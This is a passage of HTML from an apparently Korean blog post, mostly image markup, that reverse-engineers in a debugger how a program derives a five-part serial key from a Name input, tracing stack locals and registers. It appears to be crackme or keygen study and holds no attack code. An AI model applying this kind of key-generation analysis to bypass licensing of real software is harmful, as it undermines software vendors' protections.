url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABSklEQVR42m2PzU6DQBhFvwFmGIYGKAyU+UGopQyUIka00YW2lZ0+Rze+/wOYduHKk7O6yc3NhfP59P31Nc/z6XQ8HF72w7B5ex1fJs55GIWtMcMw9H0/juM8f07P0/vHx/F4PJ3P0zRBlqXrdSWkFCJPkoj5rG22pqmTOMCYIITghuu6nHMA+EuuFIXqd11RFFVVFoXieb76+ckOXbIJMCPUpYx5hBDGWJamAGBbloXQVcsCrWWzraVUd+VdU1d5nnb9rjGbZbzwGPPotexS6nn0n2WtpTFbrbVUqr5fF2UZXS7xU+1lyHZt7GCMMQBgQkQcLwE4QhFCK4RcAFBKGNMIIat1OT5s0iyk42PQrOJ9FKahz5jv+7ZtIYQIIQjgz9tnLbvOKK2EyMNg4WBHtG3dNlEU+Av/euyG4zi5EC6lyzhJOOdZRj36C3wQI+Ca0O2KAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/82e7ac0bbf5976ce8616cab74469abd5/c9b55/13.webp 165w,\n/static/82e7ac0bbf5976ce8616cab74469abd5/f2908/13.webp 330w,\n/static/82e7ac0bbf5976ce8616cab74469abd5/84ad9/13.webp 601w\"\n              sizes=\"(max-width: 601px) 100vw, 601px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/82e7ac0bbf5976ce8616cab74469abd5/04c57/13.png 165w,\n/static/82e7ac0bbf5976ce8616cab74469abd5/d9ecf/13.png 330w,\n/static/82e7ac0bbf5976ce8616cab74469abd5/d8f62/13.png 601w\"\n            sizes=\"(max-width: 601px) 100vw, 601px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/82e7ac0bbf5976ce8616cab74469abd5/d8f62/13.png\"\n            alt=\"arg1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Arg1 부분만 바뀌고 위와 같은 부분이 계속 반복되는 것을 확인할 수 있었다. Name에 “A”를 입력하고 다음과 같은 연산들을 반복했을 시 나타나는 최종 키값은 FFE3-2C73-0502A34C-8A48-E1CB이었다. 이 키값이 만들어지는 과정을 뜯어보면 다음과 같다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 417px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.72727272727273%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA4ElEQVR42n2Q3U6DQBSEZ1k4u4styy7QLljtIhTWn9iY+BZ6YXz/h1Fo09Ro/TIX5+JMZjJYPYxh2Kl0IiFijOGMOI7HMTjnpBTG2iGE602zdrVvW5UqPD2GrvdlkRVFuVhcxZyfm4mobVv8gh1C7l72IXSuNviLk/nwzPCjF5af77qX+WuRbpSSSghKKFFKCSE4jy4lH9n1fdf5pq5MbrTJtdZZtqyqlbVGSkFE3vuL5mH/PN7fCoH/a0dT56MigM8H6OONHKKOM8vYPMSJaW2ibdNY4AbwwBooge2s77gvYH4QSwIYLyEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b7a9c718f3f77734c6f4c35ff7e5281f/c9b55/14.webp 165w,\n/static/b7a9c718f3f77734c6f4c35ff7e5281f/f2908/14.webp 330w,\n/static/b7a9c718f3f77734c6f4c35ff7e5281f/b6b2f/14.webp 417w\"\n              sizes=\"(max-width: 417px) 100vw, 417px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b7a9c718f3f77734c6f4c35ff7e5281f/04c57/14.png 165w,\n/static/b7a9c718f3f77734c6f4c35ff7e5281f/d9ecf/14.png 330w,\n/static/b7a9c718f3f77734c6f4c35ff7e5281f/f27fb/14.png 417w\"\n            sizes=\"(max-width: 417px) 100vw, 417px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b7a9c718f3f77734c6f4c35ff7e5281f/f27fb/14.png\"\n            alt=\"local.7\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>LOCAL.7(== 주소지19F5FC)가 Arg1로 들어가서 ESI(==FFE374F0)를 기반으로 맨 앞의 문자열 “FFE3”을 만들어 낸다(함수 1이라 칭함).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 410px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.93939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA7UlEQVR42mWP3ZKCMAyF0xSFUkiLoKjgSim0/ozjeOFDObz//Y7DrituLpJcnO+cBOjoz6eDlDISIgzDWRDAtNrW1nUthCBSvff7/W65KtvWaq3gcvL+4J3rNpu1TGQsoneSMWaMCT4cGUNkz8Xeb73r3LFflUVKpDWlabLIc51lcSwQ0RjDOX9xE5dkGLSV6VWRo+QJShFHSmsiikTEOZ/C0+p621tbb8s8W5BSWqlXciLjcD5vmmaE2WcugLtdzxdHhP+P+vv5LXm0wFEbDI9ZCWgR1uxH/jvH/lVVBWIF0AJsAQqAHUADIAC+AWMiEzjTRBzdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/954f0997f2f42408ceecf49a17a2ce40/c9b55/15.webp 165w,\n/static/954f0997f2f42408ceecf49a17a2ce40/f2908/15.webp 330w,\n/static/954f0997f2f42408ceecf49a17a2ce40/0cb6c/15.webp 410w\"\n              sizes=\"(max-width: 410px) 100vw, 410px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/954f0997f2f42408ceecf49a17a2ce40/04c57/15.png 165w,\n/static/954f0997f2f42408ceecf49a17a2ce40/d9ecf/15.png 330w,\n/static/954f0997f2f42408ceecf49a17a2ce40/d68e4/15.png 410w\"\n            sizes=\"(max-width: 410px) 100vw, 410px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/954f0997f2f42408ceecf49a17a2ce40/d68e4/15.png\"\n            alt=\"local.9\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>LOCAL.9(== 주소지19F5F4)가 Arg1로 들어가서 LOCAL.4(==02C733B4)를 기반으로 두 번째 문자열 “2C73”을 만들어 낸다(함수 2라 칭함).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 417px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.181818181818183%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAmUlEQVR42mWMQQ6CMBRE5xOhpQmlUqitNBFDBSps9HCc3wRcGHkzm1m8QTYNzznqswRARPhhn8aYPgSlSs75tfVxjlrX3b3zvsUQwrJMtc5wYJedc1VV/V0TESUJ+vcrTqP31tqLUkrrqiylUqpp6qIoAFhrj/KX07qKm+Azz0ee5mm2hXEmRM4YA9AY46XUQCDqALf1AXjgA/jaC/svEKMlAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3ad4c8030c4efdcb5a4db47a679d547e/c9b55/16.webp 165w,\n/static/3ad4c8030c4efdcb5a4db47a679d547e/f2908/16.webp 330w,\n/static/3ad4c8030c4efdcb5a4db47a679d547e/b6b2f/16.webp 417w\"\n              sizes=\"(max-width: 417px) 100vw, 417px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3ad4c8030c4efdcb5a4db47a679d547e/04c57/16.png 165w,\n/static/3ad4c8030c4efdcb5a4db47a679d547e/d9ecf/16.png 330w,\n/static/3ad4c8030c4efdcb5a4db47a679d547e/f27fb/16.png 417w\"\n            sizes=\"(max-width: 417px) 100vw, 417px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3ad4c8030c4efdcb5a4db47a679d547e/f27fb/16.png\"\n            alt=\"local.11\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>LOCAL.11(== 주소지 19F5EC)가 Arg1로 들어가서 LOCAL.2(== 0502A34CDF1251DEE5DC2EC8D 3FC7510) 를 기반으로 세번째 문자열 “0502A34C”를 만들어 낸다(함수 3이라 칭함).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 402px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.75757575757575%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB/0lEQVR42n2SS4/TMBRGr500seNHnNhNmjZtmpA2fU9LOwKEhFixQGhAiJFYML9hFrOD1SzhV0PSMmqZMkeWN/bxd+V7IdyszaSqyoJSj3NOCLEsCxoQQgCQZVm/3/eYx7nIiyJJOknS7aU9KQW8Wi2fL5er5Wo1WyhfMebZ9omc57nrunDK/gjKm5vu2zflPOuNE7DO3DiWD84D3e8/1OerMPf0JvJTP/CVkEJKoZTinNmWlWXZ4+QDL0blRVWt5/M2Z7TFGPMIJYwxISXnDCE0HA7/K5d3d8nHD51M2AbAOV92QAgF8AE4AANQAAEABgB6e4vfv0sqpRZhkCrJhQqUMW0pBSEEAAKlglarDdAHiBEKEYoBor3cns9lkaqR8He+yhSnjFLiNti2Xb9OKcb4fNnJdttdzKpxIbUvlfS8f1ultTbGENfxKE3T1BjdEHoehfzyslgtqnEZxZE2WkrRatnHclEUxhjHcVzXVUHABZe+r5Sq5W01no9H64v1cjptWTa28EMznxiSA+nPX8G3r52JH+1iLBAGjGod4QYAGA5z1yXHzzV7EzC5/jJ4/TIrk04ZhR3dNjoIlNZhFEWhDh3HGQwGpElGp6tmt1nPJtNZ9YzWTW5C/7JPfqpsfX9Prz/xDPAY13PwaEgGaRq7bgxQAPQAYoCsWX9+9Te3rzBrcPAIfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e38d14b523fe4cb423336cc63a89238f/c9b55/17.webp 165w,\n/static/e38d14b523fe4cb423336cc63a89238f/f2908/17.webp 330w,\n/static/e38d14b523fe4cb423336cc63a89238f/56632/17.webp 402w\"\n              sizes=\"(max-width: 402px) 100vw, 402px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e38d14b523fe4cb423336cc63a89238f/04c57/17.png 165w,\n/static/e38d14b523fe4cb423336cc63a89238f/d9ecf/17.png 330w,\n/static/e38d14b523fe4cb423336cc63a89238f/0ec92/17.png 402w\"\n            sizes=\"(max-width: 402px) 100vw, 402px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e38d14b523fe4cb423336cc63a89238f/0ec92/17.png\"\n            alt=\"local.12, local.14\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>네 번째, 다섯 번째 문자열은 첫 번째, 두번째 문자열을 만드는 과정과 동일하다(함수 4,5라 칭함). 단 Arg1값과 최종적으로 만들어질 문자열이 참고하는 지점이 다르다. 이와 같은 과정을 표로 정리하면 다음과 같다.</p>\n<table>\n<thead>\n<tr>\n<th>Arg1</th>\n<th>참고 지점</th>\n<th>최종 문자열</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>LOCAL.7(==19F5F8)</td>\n<td>ESI(==FFE374F0)</td>\n<td>FFE3</td>\n</tr>\n<tr>\n<td>LOCAL.9(==19F5F0)</td>\n<td>LOCAL.4(==02C733B4)</td>\n<td>2CF3</td>\n</tr>\n<tr>\n<td>LOCAL.11(==19F5E8)</td>\n<td>LOCAL.2(==0502A34CD…)</td>\n<td>0502A34C</td>\n</tr>\n<tr>\n<td>LOCAL.12(==19F5E4)</td>\n<td>EDI(==08A48A32)</td>\n<td>8A48</td>\n</tr>\n<tr>\n<td>LOCAL.14(==19F5DC)</td>\n<td>EBX(==E1CBC640)</td>\n<td>E1CB</td>\n</tr>\n</tbody>\n</table>\n<p>다음은 문자열 “B”를 넣었을 때를 관찰한 결과이다.</p>\n<table>\n<thead>\n<tr>\n<th>Arg1</th>\n<th>참고 지점</th>\n<th>최종 문자열</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>LOCAL.7(==19F5F8)</td>\n<td>ESI(==A27E1920)</td>\n<td>A27E</td>\n</tr>\n<tr>\n<td>LOCAL.9(==19F5F0)</td>\n<td>LOCAL.4(==02D07038)</td>\n<td>2D07</td>\n</tr>\n<tr>\n<td>LOCAL.11(==19F5E8)</td>\n<td>LOCAL.2(==BA91EB0637…)</td>\n<td>BA91EB06</td>\n</tr>\n<tr>\n<td>LOCAL.12(==19F5E4)</td>\n<td>EDI(==08A50DC4)</td>\n<td>8A50</td>\n</tr>\n<tr>\n<td>LOCAL.14(==19F5DC)</td>\n<td>EBX(==A5D4EC81)</td>\n<td>A5D4</td>\n</tr>\n</tbody>\n</table>\n<p>Arg1과 참고 지점은 같으나, 참고 지점에 들어가는 문자열이 다름으로 인해 최종 결과 키값이 달라지는 것을 확인할 수 있었다. 이를 통해 미리 해당 키값들이 저장되어 있고, Name에 따라 미리 저장된 키값을 찾아가서 조합하는 것이 아니라, Name에 들어오는 문자열을 바탕으로 연산을 수행해서 스택에 저장하는 것임을 짐작할 수 있다. 다음으로는 위의 키 값이 만들어지는 다섯 파트의 바깥 부분을 관찰하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 365px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.121212121212125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABDElEQVR42m2OQW6DMBBFhyAbgouNAzYQY0gMcUhSiB21V2kXXfb+d6igza5PfzH60vsaECI/n22rm/k+U8pMb0pZwArGkfIuv4zezV3XEpI8+4XlEqKw9qS1mqZXQogxptOqruW+LjPOvLv35ni9jErttnH8rzxo3TjnUkqbhf2OZwgjTmn79oDplqs03AAEawAQjnTXiaIAIXJrT8fjwXuXJES3upT57zBnrHfvyE5Vs8ObEJ7gKCKEhGEIhciHoW8aNc/TS0LqusoYQwgBANtm7utWfKbSyljHkEAgAxCAM4zR+raU4jKOvTn4hycJqUrJOcd4kaMgph8DfJfVVcaHCAgEdQAlYP4n/wCIfxsRdia/KwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f91590a4d498e5c66d7dd0781f557ad5/c9b55/18.webp 165w,\n/static/f91590a4d498e5c66d7dd0781f557ad5/f2908/18.webp 330w,\n/static/f91590a4d498e5c66d7dd0781f557ad5/25243/18.webp 365w\"\n              sizes=\"(max-width: 365px) 100vw, 365px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f91590a4d498e5c66d7dd0781f557ad5/04c57/18.png 165w,\n/static/f91590a4d498e5c66d7dd0781f557ad5/d9ecf/18.png 330w,\n/static/f91590a4d498e5c66d7dd0781f557ad5/2e8d1/18.png 365w\"\n            sizes=\"(max-width: 365px) 100vw, 365px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f91590a4d498e5c66d7dd0781f557ad5/2e8d1/18.png\"\n            alt=\"first stack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이 45B850함수의 첫 부분과 스택을 쌓는 부분이다. PUSH 0을 반복하여 LOCAL.1부터 LOCAL.14까지 쌓는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 359px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 96.36363636363636%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB3klEQVR42pWT647aMBBGjaqFbpuQhVwNvnvGiQmOQ4D3f7UqLF21atVmv1/WaI5m5kgmX480Rfzedn66ODR9GO73m7WGUgqIJ9+ic9aaosjrhhZlIQR72+0Ox2Oe70ld7DU/Ks5jOIPVvu+vt4kz1tQ1pc3uLavqijbNt9dX8mfKMuecS61iDMZIdO0Qg9WyoTRJktVq9dH5/nyvPKtVVSgpDMB1ioj21J9jHLxv+77PsmzufYT8NWW554xJrccYAK1SSkmBaLngaZqQf6euCyklOLyMg0PrnOl9S5tqvV5vt9v/wGWZC86MMZdxANSI2rfQ1IthzpixZrqMgBpAzXBTbTYL4LoqpRTYuss4IBhEffJu+eQ9Z0cu1fhYG1B1rW3mm18WTK5LJYU2cJ3Gp7B+FrbZbJbeLLUZxwigAXX3FPay1DYXfAhnRAOofPcZYUoKIeU0RufmtU8ePyOMH4UUMQYABaC9d4wdkiTZbtNFwmZ4CAjGte4ceq3kfrdL03TRzYfDIcaAYNsWhuAFZ1VdZdlz7dXHN/r5flaqKhezMT5dorXKtV2MwSEKKdMk+fI79mse8GMy4+x06qxVYQj323SgDRMc3rKOEEsIJYQTsiMkJ8QRYghhhNSE/ADib0k3voL5GAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/60d9fdaeae00db4c85b20a5a55db2b0f/c9b55/19.webp 165w,\n/static/60d9fdaeae00db4c85b20a5a55db2b0f/f2908/19.webp 330w,\n/static/60d9fdaeae00db4c85b20a5a55db2b0f/4b5c0/19.webp 359w\"\n              sizes=\"(max-width: 359px) 100vw, 359px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/60d9fdaeae00db4c85b20a5a55db2b0f/04c57/19.png 165w,\n/static/60d9fdaeae00db4c85b20a5a55db2b0f/d9ecf/19.png 330w,\n/static/60d9fdaeae00db4c85b20a5a55db2b0f/f5eb6/19.png 359w\"\n            sizes=\"(max-width: 359px) 100vw, 359px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/60d9fdaeae00db4c85b20a5a55db2b0f/f5eb6/19.png\"\n            alt=\"all stack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위의 PUSH를 반복하는 부분을 모두 지나고 나서 쌓인 스택의 모습이다. 19F614부터 LOCAL.1이다. 스택을 쌓은 후, ESI, EDI, EBX를 생성한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 429px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 49.090909090909086%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABf0lEQVR42nXP23KbQAwGYNkJDQRWix1gOXix2SMLC8bYz9aX6EWnb9ypnek0nUQXuvn1jST4EYW/wvDn6cT2+/rQzPPEOX+NIuvcvMyuN7bXSquWH9pjW9Ul5welJGM5IQRYU4neLNc1RcyL3Fibve0RcRhHP3mtOmu1EF0ch4gkjl+TJEYkuzQlJIGqYkrLZTlTSqu6FlIiIVm2W9eLnycpO++dlB3iJgzh3wqC4B1fr1dKad008/kc3ads349+FEKcz5PojpsNbO4FAI/+jrVWl8tCEYuiMLYPgmcAMNaMflTyNPlBiBPc0SebtVa32xURm6aRSiVJnFLivR9GJ+XJOcNYHsfw8u2Ls9f1QillJZNKEpJQJNM8j9Ofn4fBai2SePMlvt1WirSsyrblj8z2vXPOGGWtLln+99UPuK5LrdXkxzRNizwLw5dHZqzpJ907WxQZAGy3/9k7LoqM84NzbkdTiliW7On5CQAadyDfSbREQRdACnAE4ADbD/g3H4IxsAf4TCUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/91b07704f7d5a60b4e7afdf20ef9d477/c9b55/20.webp 165w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/f2908/20.webp 330w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/649fd/20.webp 429w\"\n              sizes=\"(max-width: 429px) 100vw, 429px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/91b07704f7d5a60b4e7afdf20ef9d477/04c57/20.png 165w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/d9ecf/20.png 330w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/3d026/20.png 429w\"\n            sizes=\"(max-width: 429px) 100vw, 429px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/91b07704f7d5a60b4e7afdf20ef9d477/3d026/20.png\"\n            alt=\"ESI\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 425px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.303030303030305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABhUlEQVR42m2QQZKbMBBFG48T7GA7YCS1AIOMhCQkJAyTpFKVXDAXySK7HDHlmslmxm/Z1a+7/oc/l+avG3/HKDiniDGGtm126U4bfVtmrZUclNaqbdu2a3nFhOh6KTmyNP0I5wprKXtjEFlJaAjhdMjSXWqMeX5erdHWmv4q9vt9ln3KDtnxcMjzz8fjcbdLoalwkDJ6j4iElIgoum4Y+m9fv8QYnHPDQC4NAECSwFuqCqWUYZqQsZIQIUSen/L8FEOYb3G0RpuuaU4AsLnbyQuvl3iFSkk3WkYpQ66NORcFpWQK07Iuw6C8d6N1lG2K4t3nuzwo70ZKaVXXV9EdsgwAtDHzbfbeOyc5HpMEnp4eykpO3jFKKeKyLkWRA8C1l+u62tHGaITAJNkAPMqsBhUmzxgjlCDnL3Ol1C3MYfLWWkpKeAi/F9aPRiNjnHPyf69Xffg5Kdu3XXMui+2HLbxvu665HcflNjNKCSEhTNvtPVw7de2vS/njXH+vS12ABKjhjf8PrJAzGAuEDKAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/87963fa1aa531754b4cada7c11e31de3/c9b55/21.webp 165w,\n/static/87963fa1aa531754b4cada7c11e31de3/f2908/21.webp 330w,\n/static/87963fa1aa531754b4cada7c11e31de3/8dc4f/21.webp 425w\"\n              sizes=\"(max-width: 425px) 100vw, 425px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/87963fa1aa531754b4cada7c11e31de3/04c57/21.png 165w,\n/static/87963fa1aa531754b4cada7c11e31de3/d9ecf/21.png 330w,\n/static/87963fa1aa531754b4cada7c11e31de3/2fbbf/21.png 425w\"\n            sizes=\"(max-width: 425px) 100vw, 425px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/87963fa1aa531754b4cada7c11e31de3/2fbbf/21.png\"\n            alt=\"EDI\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 425px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 74.54545454545453%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACTUlEQVR42nWSyZqbMBCE24MxAg/GeCyBWAxoQUIgNvvl8kA55DK3nPJy+RjPJZmkdP671FUNP8v8l+ne57lMEkKpVm2WUQBgnA92UFpywaVkeZ4XZYHJtbyVxe0Wn6PdbgeYpiVrpGoJxgml8zK2koenSGu93lcpudKqlbwoiqIsaJZWVdkwVt2KIPCBZmnDmt4YQvCVEGM0QshxHC7EPE+96cZpELx29o7ruu7BPTzlea67B0qfcIc/nJWS8CEhxDiOfd/NyyR5DQDbP/8SpQljrDca42tC6f1xD8PX5873x8o5G8dhMGbvOPBVlCacs950BOO3K17WleArANQNW9dF69YYaUwex//CN2fOht4QjEmSSiloip/O1vbWWs7PUkCndz76D/zcGSdpU1ec1ULUyzJP86hUq/XNdHmeH9AT3n11NgZjnFLKWHOJY4zfxnG0ozXG9ANrqggAXl52z9g2wfY+A5tGizHO8qI3XXyJAUC2rR1t1yndGaVaQnBK08vlnCQJSdIwPG4TnoGNdtic09TaXgrmB4HSeitJCtnKVvKqqqqmynLaNDUXoiwyhLwN3ird4OuVEDuYS3xGyJeyXda565S1PWe1hzzfR76PgsA/Ho9hGCLvAClNmBDDB4yT9P64E/JRVd3M0ySEmCbbG30MAnfvIoQ8z3Ocl8/ACpoqKR/LvJ3n1haJohAAOOf9aKSSeZ4FR/8UheHpNY7j6Bwh5H0e24+cvqv2+30pCQnDV5pl7sEFgFzl0beTP/nuzYUI4AaQ/9kTwG9W3lWn/E8lwAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/75152c29e916e53d7432bc20603d02af/c9b55/22.webp 165w,\n/static/75152c29e916e53d7432bc20603d02af/f2908/22.webp 330w,\n/static/75152c29e916e53d7432bc20603d02af/8dc4f/22.webp 425w\"\n              sizes=\"(max-width: 425px) 100vw, 425px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/75152c29e916e53d7432bc20603d02af/04c57/22.png 165w,\n/static/75152c29e916e53d7432bc20603d02af/d9ecf/22.png 330w,\n/static/75152c29e916e53d7432bc20603d02af/2fbbf/22.png 425w\"\n            sizes=\"(max-width: 425px) 100vw, 425px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/75152c29e916e53d7432bc20603d02af/2fbbf/22.png\"\n            alt=\"EBX\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위에서부터 ESI, EDI, EBX의 값이 결정되는 부분이다. ESI 값이 생성되는 과정부터 분석해 보겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 429px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 49.090909090909086%; position: relative; bottom: 0; left: 0; background-image: 